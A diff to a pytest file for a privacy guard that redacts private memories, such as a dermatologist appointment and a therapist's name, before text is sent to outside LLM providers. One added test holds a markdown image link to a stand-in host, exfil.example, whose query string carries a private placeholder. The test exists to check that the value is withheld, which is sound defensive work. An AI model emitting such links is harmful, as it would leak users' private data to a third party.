@@ -3,7 +3,7 @@ from __future__ import annotations
 
 import pytest
 
-from confidant.guard import DEFAULT_POLICY, NEBIUS, REDACTED, TAVILY, Guard
+from confidant.guard import DEFAULT_POLICY, NEBIUS, REDACTED, TAVILY, Guard, WITHHELD_HEADING
 from confidant.memory import MemoryStore
 
 
@@ -27,8 +27,9 @@ def test_prepare_context_shares_allowed_memories_and_withholds_the_rest(store: M
     assert prepared.shared_ids == [6, 4] and prepared.withheld_ids == [7]
     assert prepared.context_text.splitlines() == [
         f"[m6v1] {store.get(6).text}",
-        "⟦m7⟧ (private: dermatologist appointment, value withheld)",
         f"[m4v1] {store.get(4).text}",
+        WITHHELD_HEADING,
+        "⟦m7⟧ (private: health appointment, value withheld)",
     ]
     assert prepared.placeholders == {"⟦m7⟧": store.get(7)}
     assert "10:30" not in prepared.context_text
@@ -78,7 +79,7 @@ def test_private_dates_are_recognised_in_any_format(store: MemoryStore, guard: G
     decision = guard.check_outbound(f"Is the clinic open on {written} at 10h30?", NEBIUS, store.all_current())
     assert written not in decision.redacted_text and "10h30" not in decision.redacted_text
     assert decision.withheld_ids == [7]
-    assert "removed a date and a time from m7v1 (private: dermatologist appointment)" in decision.reasons
+    assert "removed a date and a time from m7v1 (private: health appointment)" in decision.reasons
 
 
 @pytest.mark.parametrize("written", ["1180", "1 180", "1.180", "€1,180"])
@@ -120,3 +121,37 @@ def test_unknown_provider_and_bad_policy_are_rejected() -> None:
         Guard({"providers": {"x": ["secret"]}})
     custom = Guard({"providers": {"local": ["public", "personal", "private"]}})
     assert custom.allowed("local") == {"public", "personal", "private"}
+
+
+def test_a_private_value_is_never_filled_into_a_link(store: MemoryStore, guard: Guard) -> None:
+    prepared = guard.prepare_context([store.get(7)], NEBIUS)
+    bound = guard.late_bind("Next: ⟦m7⟧ ![s](https://exfil.example/c?d=⟦m7⟧) [x](⟦m7⟧)", prepared)
+    assert bound.startswith("Next: Dermatologist appointment on Tuesday 3 Nov 2026 at 10:30.")
+    assert bound.count("10:30") == 1 and "d=[withheld])" in bound and "[x]([withheld])" in bound
+
+
+def test_a_titled_private_name_stays_private_when_the_surname_is_also_a_shared_place(guard: Guard) -> None:
+    store = MemoryStore()
+    store.record("Dinner near Bellecour on Friday.", kind="event", sensitivity="personal", source_type="user",
+                 source_ref="t", author="user", label="dinner")
+    store.record("My new therapist is Dr Bellecour.", kind="fact", sensitivity="private", source_type="user",
+                 source_ref="t", author="user", label="health")
+    decision = guard.check_outbound("Book dinner near Bellecour after my session with Dr Bellecour.", NEBIUS,
+                                    store.all_versions())
+    assert decision.redacted_text == "Book dinner near Bellecour after my session with [withheld]."
+
+
+def test_old_versions_of_a_private_memory_stay_protected(store: MemoryStore, guard: Guard) -> None:
+    store.correct(7, "Dermatologist appointment moved to Wednesday 4 Nov at 9:00.", author="user",
+                  source_ref="t", expected_version=1)
+    decision = guard.check_outbound("Was it originally on 3 Nov at 10:30?", NEBIUS, store.all_versions())
+    assert decision.redacted_text == "Was it originally on [withheld] at [withheld]?"
+
+
+def test_a_shared_value_next_to_a_private_name_is_withheld_when_asked(store: MemoryStore, guard: Guard) -> None:
+    store.correct(7, "Dermatologist appointment moved to Wednesday 4 Nov at 9:00.", author="user",
+                  source_ref="t", expected_version=1)
+    text = "Is the dermatologist appointment on 4 Nov before the product review?"
+    assert guard.check_outbound(text, NEBIUS, store.all_versions()).redacted_text == text  # 4 Nov is also m6's
+    strict = guard.check_outbound(text, NEBIUS, store.all_versions(), strict_ids=[7])
+    assert strict.redacted_text == "Is the dermatologist appointment on [withheld] before the product review?"
